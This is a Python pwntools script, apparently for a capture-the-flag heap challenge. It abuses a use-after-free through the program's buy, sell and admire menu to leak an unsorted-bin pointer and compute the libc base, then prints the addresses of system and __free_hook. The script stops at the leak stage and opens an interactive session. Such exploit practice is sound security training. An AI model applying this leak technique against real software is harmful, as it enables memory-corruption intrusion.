from pwn import *

context.log_level = "info"

elf = ELF("./chal", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
libc_dbg = ELF("./libc.so.6.debug", checksec=False)

def start():
    # Force provided loader + libc
    return process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./chal"])

def menu(io, choice: int):
    io.sendlineafter(b"> ", str(choice).encode())

def buy(io, idx: int):
    menu(io, 1)
    io.sendlineafter(b"idx?: > ", str(idx).encode())

def sell(io, idx: int):
    menu(io, 4)
    io.sendlineafter(b"> ", str(idx).encode())

def admire(io, idx: int) -> bytes:
    menu(io, 3)
    io.sendlineafter(b"> ", str(idx).encode())
    return io.recvn(0x400)

io = start()

buy(io, 0)
sell(io, 0)

data = admire(io, 0)

fd = u64(data[0:8])
bk = u64(data[8:16])

log.success(f"unsorted fd = {hex(fd)}")
log.success(f"unsorted bk = {hex(bk)}")

# For unsorted bin, fd/bk usually point to main_arena+96
main_arena_plus = libc_dbg.symbols["main_arena"] + 96
libc.address = fd - main_arena_plus

log.success(f"libc base = {hex(libc.address)}")
log.info(f"system     = {hex(libc.sym['system'])}")
log.info(f"__free_hook= {hex(libc.sym['__free_hook'])}")

io.interactive()
